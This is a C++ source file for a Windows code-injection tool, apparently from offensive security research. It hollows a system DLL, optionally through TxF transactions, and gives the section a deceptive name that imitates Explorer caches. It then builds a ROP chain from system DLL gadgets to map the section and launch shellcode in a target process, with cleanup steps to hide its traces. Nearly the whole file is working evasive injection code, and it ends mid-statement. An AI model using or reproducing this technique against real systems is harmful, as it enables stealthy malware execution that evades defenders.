

#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <winternl.h>
#include <codecvt>
#include <Urlmon.h>   // URLOpenBlockingStreamW()
#include <atlbase.h>  // CComPtr
#include <iostream>
#include <vector>
#include <map>
#include <psapi.h>
#include <tlhelp32.h>
#include <processthreadsapi.h>
#include <algorithm>
#include "helper.h"
#include "buildrop.h"
extern "C" {
#include "memmem.h"
}
#pragma comment( lib, "Urlmon.lib" )



typedef struct {
	HANDLE process;
	HANDLE thread;
	DWORD pid;
	DWORD tid;
} TARGET_PROCESS;

typedef std::pair<std::string, DWORD64> TStrDWORD64Pair;
typedef std::map<std::string, DWORD64> TStrDWORD64Map;

typedef struct {
	LPVOID buffer;
	SIZE_T buffer_size;
	TStrDWORD64Map* metadata;
} PINJECTRA_PACKET;

typedef void(*fnAddr)();

typedef LONG(__stdcall* NtCreateSection_t)(HANDLE*, ULONG, void*, LARGE_INTEGER*, ULONG, ULONG, HANDLE);
typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(__stdcall* NtCreateTransaction_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);
typedef NTSTATUS(__stdcall* NtOpenSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef struct PINITIAL_TEB;
typedef NTSTATUS(__stdcall* NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, LPVOID, HANDLE, LPTHREAD_START_ROUTINE, LPVOID, BOOL, ULONG, ULONG, ULONG, LPVOID);

typedef NTSTATUS(__stdcall* NtExtendSection_t)(HANDLE, PLARGE_INTEGER);

#pragma once
typedef struct _CLIENT_ID* PCLIENT_ID;

NTSTATUS(NTAPI* NtQueueApcThread)(
	_In_ HANDLE ThreadHandle,
	_In_ PVOID ApcRoutine,
	_In_ PVOID ApcRoutineContext OPTIONAL,
	_In_ PVOID ApcStatusBlock OPTIONAL,
	//_In_ ULONG ApcReserved OPTIONAL
	_In_ __int64 ApcReserved OPTIONAL
	);

typedef NTSTATUS(WINAPI* NTQUERYINFORMATIONTHREAD)(
	HANDLE ThreadHandle,
	ULONG ThreadInformationClass,
	PVOID ThreadInformation,
	ULONG ThreadInformationLength,
	PULONG ReturnLength);

typedef NTSTATUS(WINAPI* MyRtlCreateUserThread)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientID);

typedef void(__stdcall* MyRtlInitUnicodeString)(
	IN PUNICODE_STRING DestinationString,
	IN __drv_aliasesMem PCWSTR SourceString
	);

typedef HANDLE(__stdcall* MyBaseGetNamedObjectDirectory)();

MyRtlCreateUserThread RtlCreateUserThread;
MyRtlInitUnicodeString RtlInitUnicodeString2;
MyBaseGetNamedObjectDirectory BaseGetNamedObjectDirectory;
NtCreateSection_t NtCreateSection;
NtExtendSection_t NtExtendSection;
NtMapViewOfSection_t NtMapViewOfSection;
NtOpenSection_t NtOpenSection;
NtCreateTransaction_t NtCreateTransaction;
NtCreateThreadEx_t NtCreateThreadEx;




bool HollowDLL(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCodeBuf, uint32_t dwReqBufSize, uint8_t** ppMappedCode, uint8_t** pprMapBuf, uint8_t** pprMappedCode, uint64_t rrpid, bool bTxF, bool vvp_to_rx) {
	WIN32_FIND_DATAW Wfd = { 0 };
	wchar_t SearchFilePath[MAX_PATH] = { 0 };
	HANDLE hFind;
	bool bMapped = false;

	//
	// Locate a DLL in the architecture appropriate system folder which has a sufficient image size to hollow for allocation.
	//

	GetSystemDirectoryW(SearchFilePath, MAX_PATH);
	wcscat_s(SearchFilePath, MAX_PATH, L"\\*.dll");

	if ((hFind = FindFirstFileW(SearchFilePath, &Wfd)) != INVALID_HANDLE_VALUE) {
		do {
			if (GetModuleHandleW(Wfd.cFileName) == nullptr) {
				HANDLE hFile = INVALID_HANDLE_VALUE, hTransaction = INVALID_HANDLE_VALUE;
				wchar_t FilePath[MAX_PATH];
				NTSTATUS NtStatus;
				uint8_t* pFileBuf = nullptr;

				GetSystemDirectoryW(FilePath, MAX_PATH);
				wcscat_s(FilePath, MAX_PATH, L"\\");
				wcscat_s(FilePath, MAX_PATH, Wfd.cFileName);

				//
				// Read the DLL to memory and check its headers to identify its image size.
				//

				if (bTxF) {
					OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES) };

					NtStatus = NtCreateTransaction(&hTransaction,
						TRANSACTION_ALL_ACCESS,
						&ObjAttr,
						nullptr,
						nullptr,
						0,
						0,
						0,
						nullptr,
						nullptr);

					if (NT_SUCCESS(NtStatus)) {
						hFile = CreateFileTransactedW(FilePath,
							GENERIC_WRITE | GENERIC_READ,
							0,
							nullptr,
							OPEN_EXISTING,
							FILE_ATTRIBUTE_NORMAL,
							nullptr,
							hTransaction,
							nullptr,
							nullptr);
					}
					else {
						printf("- Failed to create transaction (error 0x%x)\r\n", NtStatus);
					}
				}
				else {
					hFile = CreateFileW(FilePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
				}

				if (hFile != INVALID_HANDLE_VALUE) {
					uint32_t dwFileSize = GetFileSize(hFile, nullptr);
					uint32_t dwBytesRead = 0;

					pFileBuf = new uint8_t[dwFileSize];

					if (ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesRead, nullptr)) {
						SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);

						IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pFileBuf;
						IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pFileBuf + pDosHdr->e_lfanew);
						IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((uint8_t*)&pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));

						if (pNtHdrs->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC) {
							if (dwReqBufSize < pNtHdrs->OptionalHeader.SizeOfImage && (_stricmp((char*)pSectHdrs->Name, ".text") == 0 && dwReqBufSize < pSectHdrs->Misc.VirtualSize)) {
								//
								// Found a DLL with sufficient image size: map an image view of it for hollowing.
								//

								printf("* %ws - image size: %d - .text size: %d\r\n", Wfd.cFileName, pNtHdrs->OptionalHeader.SizeOfImage, pSectHdrs->Misc.VirtualSize);

								bool bTxF_Valid = false;
								uint32_t dwCodeRva = 0;

								if (bTxF) {
									//
									// For TxF, make the modifications to the file contents now prior to mapping.
									//

									uint32_t dwBytesWritten = 0;

									//
									// Wipe the data directories that conflict with the code section
									//

									for (uint32_t dwX = 0; dwX < pNtHdrs->OptionalHeader.NumberOfRvaAndSizes; dwX++) {
										if (pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress >= pSectHdrs->VirtualAddress && pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress < (pSectHdrs->VirtualAddress + pSectHdrs->Misc.VirtualSize)) {
											pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress = 0;
											pNtHdrs->OptionalHeader.DataDirectory[dwX].Size = 0;
										}
									}

									//
									// Find a range free of relocations large enough to accomodate the code.
									//

									bool bRangeFound = false;
									uint8_t* pRelocBuf = (uint8_t*)GetPAFromRVA(pFileBuf, pNtHdrs, pSectHdrs, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

									if (pRelocBuf != nullptr) {
										for (dwCodeRva = 0; !bRangeFound && dwCodeRva < pSectHdrs->Misc.VirtualSize; dwCodeRva += dwReqBufSize) {
											if (!CheckRelocRange(pRelocBuf, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size, pSectHdrs->VirtualAddress + dwCodeRva, pSectHdrs->VirtualAddress + dwCodeRva + dwReqBufSize)) {
												bRangeFound = true;
												break;
											}
										}

										if (bRangeFound) {
											printf("+ Found a blank region with code section to accomodate payload at 0x%08x\r\n", dwCodeRva);
										}
										else {
											printf("- Failed to identify a blank region large enough to accomodate payload\r\n");
										}

										memcpy(pFileBuf + pSectHdrs->PointerToRawData + dwCodeRva, pCodeBuf, dwReqBufSize);

										if (WriteFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesWritten, nullptr)) {
											printf("+ Successfully modified TxF file content.\r\n");
											bTxF_Valid = true;
										}
									}
									else {
										printf("- No relocation directory present.\r\n");
									}
								}

								if (!bTxF || bTxF_Valid) {
									HANDLE hSection = nullptr;
									OBJECT_ATTRIBUTES LocalAttributes;
									UNICODE_STRING szName;

									// Section name: "C:*ProgramData*Microsoft*Windows*Caches*{DDF571F2-BE98-426D-8828-1A9A39C3FDA2}.2.ver0x0000000000000001.db" (name similar to sections commonly loaded by Explorer)
									RtlInitUnicodeString2 = (MyRtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll"), "RtlInitUnicodeString");
									RtlInitUnicodeString2(&szName, L"\\Sessions\\1\\BaseNamedObjects\\C:*ProgramData*Microsoft*Windows*Caches*{DDF571F2-BE98-426D-8828-1A9A39C3FDA2}.2.ver0x0000000000000001.db");

									InitializeObjectAttributes(&LocalAttributes, &szName, OBJ_CASE_INSENSITIVE, NULL, NULL);
									NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, &LocalAttributes, nullptr, PAGE_READONLY, SEC_IMAGE, hFile);

									if (NT_SUCCESS(NtStatus)) {

										*pqwMapBufSize = 0; // The map view is an in and out parameter, if it isn't zero the map may have its size overwritten
										NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, nullptr, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY); // AllocationType of MEM_COMMIT|MEM_RESERVE is not needed for SEC_IMAGE.
										SIZE_T viewSize = *pqwMapBufSize;

										PVOID sectionTarget = NULL;

										if (NT_SUCCESS(NtStatus)) {
											if (*pqwMapBufSize >= pNtHdrs->OptionalHeader.SizeOfImage) { // Verify that the mapped size is of sufficient size. There are quirks to image mapping that can result in the image size not matching the mapped size.
												printf("* %ws - mapped size: %I64u\r\n", Wfd.cFileName, *pqwMapBufSize);
												*ppMappedCode = *ppMapBuf + pSectHdrs->VirtualAddress + dwCodeRva;

												if (!bTxF) {
													uint32_t dwOldProtect = 0;
													if (VirtualProtect(*ppMappedCode, dwReqBufSize, PAGE_READWRITE, (PDWORD)&dwOldProtect)) {
														memcpy(*ppMappedCode, pCodeBuf, dwReqBufSize);

														if (VirtualProtect(*ppMappedCode, dwReqBufSize, dwOldProtect, (PDWORD)&dwOldProtect)) {
															bMapped = true;
														}

													}
												}
												else {
													bMapped = true;
												}
											}
										}
										else {
											printf("- Failed to create mapping of section (error 0x%08x)", NtStatus);
										}
									}
									else {
										printf("- Failed to create section (error 0x%x)\r\n", NtStatus);
									}
								}
								else {
									printf("- TxF initialization failed.\r\n");
								}
							}
						}
					}

					if (pFileBuf != nullptr) {
						delete[] pFileBuf;
					}

					if (hFile != INVALID_HANDLE_VALUE) {
						CloseHandle(hFile);
					}

					if (hTransaction != INVALID_HANDLE_VALUE) {
						CloseHandle(hTransaction);
					}
				}
			}
		} while (!bMapped && FindNextFileW(hFind, &Wfd));

		FindClose(hFind);
	}

	return bMapped;
}



PINJECTRA_PACKET* BuildROPChain(TStrDWORD64Map& runtime_parameters, uint64_t map_size, bool is_image_backed, int exec_option, int unmap_option, bool vvp_to_rx) {
	PINJECTRA_PACKET* output;
	DWORD64 rop_pos = 0;
	DWORD64* ROP_chain;
	output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));

	HMODULE ntdll = GetModuleHandleA("ntdll");
	TEXT_SECTION_INFO ntdll_info = GetTextSection(ntdll);

	HMODULE kernel32 = GetModuleHandleA("kernel32");
	TEXT_SECTION_INFO kernel32_info = GetTextSection(kernel32);

	HMODULE advapi = LoadLibraryA("advapi32.dll");
	TEXT_SECTION_INFO advapi_info = GetTextSection(advapi);

	HMODULE msvcp_win = GetModuleHandleA("msvcp_win");
	TEXT_SECTION_INFO msvcp_win_info = GetTextSection(msvcp_win);

	DWORD64 LoadLibraryA_location = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

	DWORD64 GADGET_ret = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\xc3", 1);
	DWORD64 GADGET_pivot = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x5C\xC3", 2); // pop rsp; ret
	DWORD64 GADGET_RAX_pivot = (DWORD64)memmem(((BYTE*)kernel32_info.address), kernel32_info.size, "\x50\xc3", 2); 	//0x000000018003afb4 : push rax; ret // 50c3
	DWORD64 GADGET_RCX_pivot = (DWORD64)memmem(((BYTE*)msvcp_win_info.address), msvcp_win_info.size, "\x51\xc3", 2); // push rcx; ret //51c3

	DWORD64 GADGET_popregs = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x58\x5a\x59\x41\x58\x41\x59\x41\x5a\x41\x5b\xc3", 12);
	DWORD64 GADGET_popRCX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x59\xC3", 2); // pop rcx; ret;
	DWORD64 GADGET_popRDX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x5a\x41\x5b\xc3", 4); //pop rdx pop r11 ret
	DWORD64 GADGET_popR8 = (DWORD64)memmem((BYTE*)ntdll_info.address, ntdll_info.size, "\x41\x58\xc3", 3); // pop r8 ; ret;
	DWORD64 GADGET_POP_R9_R10_r11 = (DWORD64)memmem((BYTE*)ntdll_info.address, ntdll_info.size, "\x41\x59\x41\x5a\x41\x5b\xc3", 7); //0x000000018008fb34 : pop r9 ; pop r10 ; pop r11 ; ret // 4159415a415bc3
	DWORD64 GADGET_popR14 = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x41\x5E\xC3", 3);

	DWORD64 GADGET_RAXtoRCX = (DWORD64)memmem((BYTE*)advapi_info.address, advapi_info.size, "\x48\x8b\xc8\x48\x8b\xc1\x48\x83\xc4\x28\xc3", 11); //0x000000018001852a : mov rcx, rax ; mov rax, rcx ; add rsp, 0x28 ; ret // 488bc8488bc14883c428c3
	DWORD64 GADGET_RAXtoRBX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x50\x5b\xc3", 3); //0x00000001800011a3 : push rax ; pop rbx ; ret // 505bc3
	DWORD64 GADGET_RAXtoR9 = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x4C\x8B\xC8\x49\x8B\xC1\x48\x83\xC4\x28\xC3", 11); //mov r9, rax; mov rax, r9; add rsp, 0x28; ret;
	DWORD64 GADGET_RBXtoRAX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x48\x8b\xc3\x48\x83\xc4\x20\x5b\xc3", 9); //0x00000001800695d8 : mov rax, rbx ; add rsp, 0x20 ; pop rbx ; ret // 488bc34883c4205bc3
	DWORD64 GADGET_AddR14toRAX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x4C\x01\xF0\xC3", 4);
	DWORD64 GADGET_RCXtoR8 = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x4c\x8b\xc1\x48\x3b\xca\x77\xd7\x49\x8b\xc0\xc3\xcc\x33\xc0\xc3", 16); //mov r8, rcx; cmp rcx, rdx; ja 0x64bd9; mov rax, r8; ret;

	DWORD64 GADGET_addrsp = (DWORD64)memmem((BYTE*)ntdll_info.address, ntdll_info.size, "\x48\x83\xC4\x28\xC3", 5); // add rsp, 0x28; ret
	DWORD64 GADGET_addrsp_0x38 = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x48\x83\xC4\x38\xC3", 5); //add rsp, 0x38; ret

	ROP_chain = (DWORD64*)malloc(100 * sizeof(DWORD64));

#define DONT_CARE 0

	if ((runtime_parameters["tos"] + 10 * sizeof(DWORD64)) & 0xF) // stack before return address of MessageBoxA is NOT aligned - force alignment
	{
		ROP_chain[rop_pos++] = GADGET_ret;
	}

	// Load the 2 additional libraries used in gadgets - advapi32 and msvcp_win_info. They should be loaded in already but just in case (Explorer will have them loaded)
	ROP_chain[rop_pos++] = GADGET_popregs;
	ROP_chain[rop_pos++] = 0x0; // rax
	ROP_chain[rop_pos++] = 0x0; // rdx
	DWORD64 advapi_string = rop_pos++; ; //rcx
	ROP_chain[rop_pos++] = DONT_CARE;// r8
	ROP_chain[rop_pos++] = DONT_CARE; // r9
	ROP_chain[rop_pos++] = DONT_CARE; // r10
	ROP_chain[rop_pos++] = DONT_CARE; // r11
	ROP_chain[rop_pos++] = LoadLibraryA_location;

	ROP_chain[rop_pos++] = GADGET_popregs;
	ROP_chain[rop_pos++] = 0x0; // rax
	ROP_chain[rop_pos++] = 0x0; // rdx
	DWORD64 msvcp_win_string = rop_pos++; ; //rcx
	ROP_chain[rop_pos++] = DONT_CARE;// r8
	ROP_chain[rop_pos++] = DONT_CARE; // r9
	ROP_chain[rop_pos++] = DONT_CARE; // r10
	ROP_chain[rop_pos++] = DONT_CARE; // r11
	ROP_chain[rop_pos++] = LoadLibraryA_location;

	ROP_chain[rop_pos++] = GADGET_popregs;

	ROP_chain[rop_pos++] = 0x0; // rax
	ROP_chain[rop_pos++] = 0x1; // rdx
	if (vvp_to_rx) {
		ROP_chain[rop_pos++] = 0x0004; //rcx  //normal one
	}
	else {
		ROP_chain[rop_pos++] = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE; //rcx
	}
	DWORD64 mapname = rop_pos++; // r8
	ROP_chain[rop_pos++] = DONT_CARE; // r9
	ROP_chain[rop_pos++] = DONT_CARE; // r10
	ROP_chain[rop_pos++] = DONT_CARE; // r11
	ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "OpenFileMappingA");
	ROP_chain[rop_pos++] = GADGET_addrsp;
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp


	// transfer RAX to RCX, adjust stack from by fourty bytes
	ROP_chain[rop_pos++] = GADGET_RAXtoRCX;
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp

	// RDX
	ROP_chain[rop_pos++] = GADGET_popRDX;
	if (vvp_to_rx) {
		ROP_chain[rop_pos++] = 0x0004; //rcx  //normal one
	}
	else {
		ROP_chain[rop_pos++] = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE; //rcx
	}
	ROP_chain[rop_pos++] = 0x0; // <- r11

	// R8
	ROP_chain[rop_pos++] = GADGET_popR8;
	ROP_chain[rop_pos++] = 0x0; // <- r8

	// R9
	ROP_chain[rop_pos++] = GADGET_POP_R9_R10_r11;
	ROP_chain[rop_pos++] = 0x0; // r9
	ROP_chain[rop_pos++] = DONT_CARE; // r10
	ROP_chain[rop_pos++] = DONT_CARE; // r11

	// 5th arg - placed on stack b/c of FastCall x64 calling convention
	ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "MapViewOfFile");
	ROP_chain[rop_pos++] = GADGET_addrsp;
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = map_size; //  


	// if it is image backed, we need to move the pointer forward by 0x1000 to the .text RX region
	if (is_image_backed) {
		ROP_chain[rop_pos++] = GADGET_popR14;
		int virtual_address_offset = 4096; //0x1000
		ROP_chain[rop_pos++] = virtual_address_offset;
		// Now we need to add R14 to RAX
		ROP_chain[rop_pos++] = GADGET_AddR14toRAX;
	}


	while (1) {
		if (exec_option == 0) {
			ROP_chain[rop_pos++] = GADGET_RAX_pivot;
			ROP_chain[rop_pos++] = GADGET_addrsp;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			break;
		}
		//store the mapped address in RBX, which doesn't get clobbered by CreateThread, so we can unmap after
		ROP_chain[rop_pos++] = GADGET_RAXtoRBX;
		if (exec_option == 1) {
			ROP_chain[rop_pos++] = GADGET_RAXtoRCX;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
			// Now we need to get RDX to be higher than RCX
			ROP_chain[rop_pos++] = GADGET_popRDX;
			ROP_chain[rop_pos++] = 0xffffffffffffffff; // pop into RDX
			ROP_chain[rop_pos++] = DONT_CARE; //pop into R11
			ROP_chain[rop_pos++] = GADGET_RCXtoR8;
			//Now the target address is properly in R8
			//// CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
			ROP_chain[rop_pos++] = GADGET_popRCX;
			ROP_chain[rop_pos++] = 0x0;
			ROP_chain[rop_pos++] = GADGET_popRDX;
			ROP_chain[rop_pos++] = 0x0; // <- rdx
			ROP_chain[rop_pos++] = 0x0; // <- r11, irrelevant
			ROP_chain[rop_pos++] = GADGET_POP_R9_R10_r11;
			ROP_chain[rop_pos++] = DONT_CARE; // r9
			ROP_chain[rop_pos++] = DONT_CARE; // r10
			ROP_chain[rop_pos++] = DONT_CARE; // r11

			//// then the function call
			ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateThread");
			ROP_chain[rop_pos++] = GADGET_addrsp_0x38; //skips 56 bytes, aka 7 spots
			//ROP_chain[rop_pos++] = DONT_CARE;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = 0x2710; // 5th arg
			ROP_chain[rop_pos++] = 0x0; // 6th arg
			ROP_chain[rop_pos++] = DONT_CARE;
			ROP_chain[rop_pos++] = GADGET_addrsp;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			break;
		}
		if (exec_option == 2) {
			ROP_chain[rop_pos++] = GADGET_popRCX;
			ROP_chain[rop_pos++] = 0x0;

			ROP_chain[rop_pos++] = GADGET_RAXtoR9;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
			ROP_chain[rop_pos++] = GADGET_popR8;
			ROP_chain[rop_pos++] = GADGET_RCX_pivot; // RCX_pivot into R8 - this is where new thread will start
			ROP_chain[rop_pos++] = GADGET_popRDX;
			ROP_chain[rop_pos++] = 0x0; // <- rdx //2mb stack?
			ROP_chain[rop_pos++] = 0x0; // <- r11, irrelevant

			//// then the function call
			ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateThread");
			ROP_chain[rop_pos++] = GADGET_addrsp_0x38; //skips 56 bytes, aka 7 spots
			//ROP_chain[rop_pos++] = DONT_CARE;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = 0x0; // 5th arg
			ROP_chain[rop_pos++] = 0x0; // 6th arg
			ROP_chain[rop_pos++] = DONT_CARE;
			ROP_chain[rop_pos++] = GADGET_addrsp;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		}
	}
	if (unmap_option) {
		// UNMAP VIEW of the section now
		// First we need to sleep (10 seconds = 0x2710) while the shellcode executes
		ROP_chain[rop_pos++] = GADGET_popRCX;
		ROP_chain[rop_pos++] = 0x2710;
		ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "Sleep");
		ROP_chain[rop_pos++] = GADGET_addrsp;
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space

		// Now we can recover the pointer from RBX and unmap
		ROP_chain[rop_pos++] = GADGET_RBXtoRAX;
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE;
		ROP_chain[rop_pos++] = GADGET_RAXtoRCX;
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp

		// RDX
		ROP_chain[rop_pos++] = GADGET_popRDX;
		ROP_chain[rop_pos++] = 0x0; // <- rdx
		ROP_chain[rop_pos++] = 0x0; // <- r11

		// R8
		ROP_chain[rop_pos++] = GADGET_popR8;
		ROP_chain[rop_pos++] = 0x0; // <- r8

		// R9
		ROP_chain[rop_pos++] = GADGET_POP_R9_R10_r11;
		ROP_chain[rop_pos++] = 0x0; // r9
		ROP_chain[rop_pos++] = DONT_CARE; // r10
		ROP_chain[rop_pos++] = DONT_CARE; // r11

		// 5th arg - placed on stack b/c of FastCall x64 calling convention
		ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "UnmapViewOfFile");
		ROP_chain[rop_pos++] = GADGET_addrsp;
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE;
	}

	//////////////////// CLEANUP CODE /////////////////////
	ROP_chain[rop_pos++] = GADGET_popregs;
	ROP_chain[rop_pos++] = DONT_CARE; // rax
	DWORD64 saved_return_address = rop_pos++; // rdx
	ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
	ROP_chain[rop_pos++] = 8; // r8
	ROP_chain[rop_pos++] = DONT_CARE; // r9
	ROP_chain[rop_pos++] = DONT_CARE; // r10
	ROP_chain[rop_pos++] = DONT_CARE; // r11
	ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(ntdll, "memmove");
	ROP_chain[rop_pos++] = GADGET_addrsp;
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp

	ROP_chain[rop_pos++] = GADGET_pivot;
	ROP_chain[rop_pos++] = runtime_parameters["orig_tos"];

	//copy advapi32.dll and msvcp_win.dll into the proper positions in chain
	ROP_chain[advapi_string] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
	strcpy((char*)&ROP_chain[rop_pos++], "advapi32");
	strcpy((char*)&ROP_chain[rop_pos++], ".dll\0");

	ROP_chain[msvcp_win_string] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
	strcpy((char*)&ROP_chain[rop_pos++], "msvcp_wi");
